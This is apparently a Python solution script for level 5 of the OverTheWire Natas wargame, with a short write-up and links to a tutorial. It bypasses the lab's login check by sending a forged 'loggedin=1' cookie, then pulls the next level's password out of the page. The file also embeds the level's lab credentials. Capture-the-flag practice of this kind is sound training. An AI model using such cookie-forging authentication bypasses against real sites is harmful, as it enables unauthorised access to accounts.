#!/usr/bin/env python3
'''
https://github.com/JohnHammond/overthewire_natas_solutions/blob/master/natas5.py
https://www.youtube.com/watch?v=Sf63W1xXzNU&list=PL1H1sBF1VAKWM3wMCn6H5Ql6OrgIivt2V&index=3 
4:38
https://docs.python-requests.org/en/master/
https://docs.python-requests.org/en/master/user/quickstart/#cookies

Level 5 → Level 6
Username: natas5
URL:      http://natas5.natas.labs.overthewire.org
password: iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
problem: Access disallowed. You are not logged in
write up:

1. F12  --->  Developer Tools --->  Storage Inspector
2. Set loggedIn cookie Value to 1 ---> refresh Natas5 webpage

 
'''
import requests
import re

username = 'natas5'
password = 'iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq'

cookies = { "loggedin" : "1" }
url = 'http://%s.natas.labs.overthewire.org/' % username
session = requests.Session()

# response = requests.get(url, auth = (username, password), headers = headers )

response = session.get(url, auth = (username, password), cookies = cookies )
print('\nURL = ',url,'\n')

content = response.text
print("response.text \n",response.text)
print("response.cookies \n",response.cookies)
print("response.cookies[loggedin] = ",response.cookies['loggedin'])

results =re.findall(' natas6 is (.*)</div>', content)[0]
print (results)
 